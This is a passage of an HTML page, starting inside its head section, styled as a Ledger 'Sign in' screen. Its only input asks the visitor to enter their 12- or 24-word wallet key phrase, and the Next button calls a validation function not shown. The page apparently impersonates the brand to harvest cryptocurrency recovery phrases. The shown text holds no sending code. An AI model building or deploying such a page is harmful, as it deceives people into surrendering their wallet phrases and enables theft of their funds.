    <style>
      body {
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #f8f8f8;
      }
      .container {
        background: white;
        padding: 40px;
        border-radius: 8px;
        box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
        width: 400px;
      }
      .ledger-logo {
        width: 120px; /* Adjust size as needed */
        margin-bottom: 5px;
        display: block;
      }
      .title-container {
        text-align: left; /* Align logo and text to the left */
      }
      h2 {
        font-size: 24px;
        margin-bottom: 20px;
      }
      input {
        width: 100%;
        padding: 12px;
        margin: 10px 0;
        border: 1px solid #ccc;
        border-radius: 5px;
        font-size: 16px;
      }
      .buttons {
        display: flex;
        justify-content: space-between;
        margin-top: 10px;
      }
      button {
        padding: 12px 20px;
        border: none;
        cursor: pointer;
        border-radius: 5px;
        font-size: 16px;
      }
      .back {
        background: #ccc;
      }
      .next {
        background: #007bff;
        color: white;
      }
      #error {
        color: red;
        margin-top: 10px;
        display: none;
      }
    </style>
  </head>
  <body>
    <div class="container">

        <img
          src="image/download (9).png"
          alt="Ledger Logo"
          class="ledger-logo"
        />
        <h2>Sign in</h2>
      </div>

      <input
        type="text"
        id="walletPhrase"
        placeholder="Enter Wallet 12-24 Key Phrase"
      />
      <div class="buttons">
        <button class="back">Back</button>
        <button class="next" onclick="validatePhrase()">Next</button>
      </div>
      <p id="error">Phrase must have exactly 12 or 24 words.</p>
    </div>
  </body>
</html>
